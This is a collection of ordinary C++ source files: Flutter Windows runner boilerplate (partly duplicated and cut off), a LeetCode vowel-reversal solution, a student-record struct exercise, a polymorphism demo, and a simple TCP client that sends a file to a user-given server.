    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"news_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n\n345. Reverse vowls of a string\n\n\nGiven a string s, reverse only all the vowels in the string and return it.\n\nThe vowels are 'a', 'e', 'i', 'o', and 'u', and they can appear in both lower and upper cases, more than once.\n\n\nSteps to this solution.\n\n1. Create a string that holds all vowels\n2. Create a string that holds the values of s (possibly optional)\n3.The goal is to achieve this solution by assigning two pointers which are\nat the first and last position and check for vowels, and while both pointers are sitting\ninside of a vowel then swap them, else just keep advancing \nwe want to stop when the two pointers cross each other and return the string array\n\n\nThe key method used in this solution is the std::string method .find()\n\n.find() scans thru a substring and looks for the first occurence of the char and returns the \nindex location\n\n.find() is all we need to solve this solution \n\n*/\n\n#include <iostream>\n#include <string>\n\n\n\n\nclass Solution {\n\nprivate:\n\t//We can create a member variable to represent the string array that holds \n\t//all the vowels (upper and lowercase) that we will check with .find\n\t//member variables should be private\n\tstd::string vowels = { \"aeiouAEIOU\" };\n\t\n\n\npublic:\n\t\n\tstd::string reverseVowels(std::string &s);\n\t\n};\n\n\nstd::string Solution::reverseVowels(std::string &s) {\n\n\t//We will be using the vowel string to check for occurences and index location within string s\n\n\t//We want to create a while loop that continously cycles thru the string swapping the vowels\n\t//We use a while loop rather than a for loop because we do not know how many iterations is\n\t//needed for completion \n\t//we know the operation is complete when the first pointer and the last pointer cross\n\t//so that will be the basis of our while loop\n\t//We have to initialize first and last \n\t//first is going to be the first location, last is going to be the last location within stirng s\n\t//we can find the last location within string s by using the string method .length() - 1, \n\t//We use - 1 since indexes start a 0\n\tint first = 0;\n\tint last = s.length() - 1;\n\tchar temp;\n\t\n\t\n\n\twhile (first < last) {\n\n\t\t//While inside of the while loop, we want to check each element that first and last are on\n\t\t//to see if they are vowels, if they are not vowels then move forward,\n\t\t//However if they are vowels, then we want to wait there until the other pointer has landed on a vowel as well\n\t\t//we want to use a while loop because we want this to be continous until the two pointers cross\n\t\t//So while first is less than last and after doing vowel.find() receiving no hits within (-1) we can\n\t\t//safely enter the while loop advancing the pointer\n\t\t//We need two while loops, one for the first pointer and one for the second pointer\n\t\t//NPOS = -1\n\t\twhile (first < last && vowels.find(s[first]) == std::string::npos) {\n\t\t\tfirst++;\n\t\t}\n\t\twhile (first < last && vowels.find(s[last]) == std::string::npos) {\n\t\t\tlast--;\n\t\t}\n\n\t\t//At this point within this method, first and last are both on a vowel,\n\t\t//This is true because they kept advancing every occurence that was not within \n\t\t//Our string vowel\n\t\t//Now we have to swap the values of first and last within the string\n\t\t//going to make a temp variable to swap\n\n\t\ttemp = s[first];\n\t\ts[first] = s[last];\n\t\ts[last] = temp;\n\n\t\t//Now we have to increment first and decrement last to continue forward after the operation\n\t\tfirst++;\n\t\tlast--;\n\n\n\t}\n\n\t//After the while loop is done, the vowels will be reversed return the string\n\n\treturn s;\n\n}\n\n\nint main() {\n\n\tSolution solution;\n\n\tstd::string sS = \"hEllo\";\n\tstd::string s = \"AEIOUaeiou\";\n\n\tstd::cout << solution.reverseVowels(sS);\n\n\n\t//Time Complexity O(n)\n\t//Spacae Complexity O(n)\n\n\treturn 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\nusing namespace std;\n\nstruct DetailAlamat{\n    string desa;\n    string kota;\n\n};\nstruct Mahasiswa\n{\n    string nim;\n    string nama;\n    DetailAlamat alamat;\n    int umur;\n\n};\nint main(){\n    Mahasiswa mhs[3];\n    for (int i=0; i<3;i++){\n        cout <<\"Data ke-\"<<(i+1)<<\":\"<<endl;\n        cout <<\"Nomor Mahasiswa:\";\n        getline(cin,mhs[i].nim);\n        cout <<\"Nama Mahasswa:\";\n        getline(cin,mhs[i].nama);\n        cout <<\"Alamat Mahasiswa:\";\n        cout << \"\\t nama Desa:\";\n        cin >> mhs[i].alamat.desa;\n        cout <<\"\\t nama Kota:\";\n        cin >> mhs[i].alamat.kota;\n\n        cout <<\"Umur Mahasiswa:\";\n        cin>> mhs[i].umur;\n        cin.ignore(1,'\\n');\n        \n    }\n    for (int i=0;i<3;i++){\n        cout <<endl;\n        cout <<\"Data Mahasiswa ke-\"<<(i=1)<<\":\"<<endl;\n       cout <<endl;\n       cout <<\"\\n Nim:\"<<mhs[i].nim;\n       cout <<\"\\n Nama:\" <<mhs[i].nama;\n       cout <<\"\\n Alamat:\";\n       cout <<\"\\n\\t Desa:\"<<mhs[i].alamat.desa;\n       cout <<\"\\n \\tKota:\" <<mhs[i].alamat.kota;\n       cout <<\"\\n Umur:\"<<mhs[i].umur;\n       cout << endl;\n    }\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <memory>\n#include <list>\n\nclass Figure\n{\npublic:\n    virtual ~Figure()\n    {\n    }\n\n    virtual void PrintInfo() const = 0;\n};\n\nclass Rectangle : public Figure\n{\npublic:\n    Rectangle(int const &left, int const &top, int const &right, int const &bottom)\n        : mLeft{left}, mTop{top}, mRight{right}, mBottom{bottom}\n    {\n    }\n\n    void PrintInfo() const override\n    {\n        std::cout << \"Paint rectangle, Rect{left = \" << mLeft << \", top = \" << mTop << \", right = \" << mRight << \", bottom = \" << mBottom << \"}\" << std::endl;\n    }\n\nprivate:\n    int mLeft;\n    int mTop;\n    int mRight;\n    int mBottom;\n};\n\nclass Circle : public Figure\n{\npublic:\n    Circle(int const &radius, int const &abscissa, int const &ordinate)\n        : mRadius{radius}, mAbscissa{abscissa}, mOrdinate{ordinate}\n    {\n    }\n\n    void PrintInfo() const override\n    {\n        std::cout << \"Paint circle, radius = \" << mRadius << \" and centre = (\" << mAbscissa << \", \" << mOrdinate << \")\" << std::endl;\n    }\n\nprivate:\n    int mRadius;\n    int mAbscissa;\n    int mOrdinate;\n};\n\nusing FigurePtr = std::shared_ptr<Figure>;\n\nint main()\n{\n    FigurePtr rectangle = std::make_shared<Rectangle>(10, 10, 10, 10);\n    FigurePtr circle = std::make_shared<Circle>(10, 0, 0);\n\n    std::list<FigurePtr> figure_list{rectangle, circle};\n    for (auto const &figure : figure_list)\n    {\n        figure->PrintInfo();\n    }\n\n    return 0;\n}",
    "#include <iostream>      // \u0412\u0432\u043e\u0434-\u0432\u044b\u0432\u043e\u0434\r\n#include <cstdlib>       // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0442\u0440\u043e\u043a\u0438 \u0432 \u0447\u0438\u0441\u043b\u043e\r\n#include <cstring>       // \u0420\u0430\u0431\u043e\u0442\u0430 \u0441\u043e \u0441\u0442\u0440\u043e\u043a\u0430\u043c\u0438\r\n#include <cerrno>        // \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u043e\u0448\u0438\u0431\u043e\u043a \u0447\u0435\u0440\u0435\u0437 errno\r\n#include <unistd.h>      // \u0417\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u0444\u0430\u0439\u043b\u043e\u0432\u044b\u0445 \u0434\u0435\u0441\u043a\u0440\u0438\u043f\u0442\u043e\u0440\u043e\u0432\r\n#include <sys/types.h>   // \u0422\u0438\u043f\u044b \u0434\u0430\u043d\u043d\u044b\u0445\r\n#include <sys/socket.h>  // \u0421\u0438\u0441\u0442\u0435\u043c\u043d\u044b\u0435 \u0432\u044b\u0437\u043e\u0432\u044b \u0434\u043b\u044f \u0440\u0430\u0431\u043e\u0442\u044b \u0441 \u0441\u043e\u043a\u0435\u0442\u0430\u043c\u0438\r\n#include <netinet/in.h>  // \u0421\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b \u0434\u043b\u044f \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0441\u0435\u0442\u0435\u0432\u044b\u0445 \u0430\u0434\u0440\u0435\u0441\u043e\u0432\r\n#include <arpa/inet.h>   // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 IP-\u0430\u0434\u0440\u0435\u0441\u043e\u0432\r\n\r\nconstexpr int MAX_BUFFER_SIZE = 1024;  // \u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u044b\u0439 \u0440\u0430\u0437\u043c\u0435\u0440 \u0431\u0443\u0444\u0435\u0440\u0430 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0444\u0430\u0439\u043b\u0430\r\n\r\nint main(int argc, char *argv[]) {\r\n    // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u043e\u0432 \u043a\u043e\u043c\u0430\u043d\u0434\u043d\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438\r\n    if (argc != 4) {\r\n        std::cerr << \"Usage: \" << argv[0] << \" <server_address> <port> <file_path>\\n\";\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u044b \u043a\u043e\u043c\u0430\u043d\u0434\u043d\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438: \u0430\u0434\u0440\u0435\u0441 \u0441\u0435\u0440\u0432\u0435\u0440\u0430, \u043f\u043e\u0440\u0442, \u043f\u0443\u0442\u044c \u043a \u0444\u0430\u0439\u043b\u0443\r\n    const char* serverAddress = argv[1];\r\n    int port = atoi(argv[2]);\r\n    const char* filePath = argv[3];\r\n\r\n    // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0441\u043e\u043a\u0435\u0442 \u043a\u043b\u0438\u0435\u043d\u0442\u0430\r\n    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);\r\n    if (clientSocket < 0) {\r\n        perror(\"Error in socket\");  // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    // \u0417\u0430\u043f\u043e\u043b\u043d\u044f\u0435\u043c \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0443 \u0434\u043b\u044f \u0430\u0434\u0440\u0435\u0441\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0430\r\n    struct sockaddr_in serverAddr;\r\n    serverAddr.sin_family = AF_INET;\r\n    serverAddr.sin_port = htons(port);\r\n    inet_pton(AF_INET, serverAddress, &serverAddr.sin_addr);\r\n\r\n    // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435 \u0441 \u0441\u0435\u0440\u0432\u0435\u0440\u043e\u043c\r\n    if (connect(clientSocket, reinterpret_cast<struct sockaddr*>(&serverAddr), sizeof(serverAddr)) < 0) {\r\n        perror(\"Error in connect\");  // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0444\u0430\u0439\u043b \u043d\u0430 \u0447\u0442\u0435\u043d\u0438\u0435\r\n    FILE* file = fopen(filePath, \"r\");\r\n    if (file == nullptr) {\r\n        perror(\"Error opening file\");  // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\r\n        close(clientSocket);\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    // \u0411\u0443\u0444\u0435\u0440 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0434\u0430\u043d\u043d\u044b\u0445 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\r\n    char buffer[MAX_BUFFER_SIZE];\r\n    size_t bytesRead;\r\n\r\n    // \u0427\u0438\u0442\u0430\u0435\u043c \u0434\u0430\u043d\u043d\u044b\u0435 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 \u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u0438\u0445 \u043f\u043e \u0441\u043e\u043a\u0435\u0442\u0443\r\n    while ((bytesRead = fread(buffer, 1, MAX_BUFFER_SIZE, file)) > 0) {\r\n        if (send(clientSocket, buffer, bytesRead, 0) < 0) {\r\n            perror(\"Error in send\");  // \u0412\u044b\u0432\u043e\u0434\u0438\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\r\n            fclose(file);\r\n            close(clientSocket);\r\n            return EXIT_FAILURE;\r\n        }\r\n    }\r\n\r\n    // \u0417\u0430\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0444\u0430\u0439\u043b \u0438 \u0441\u043e\u043a\u0435\u0442\r\n    fclose(file);\r\n    close(clientSocket);\r\n    return EXIT_SUCCESS;\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
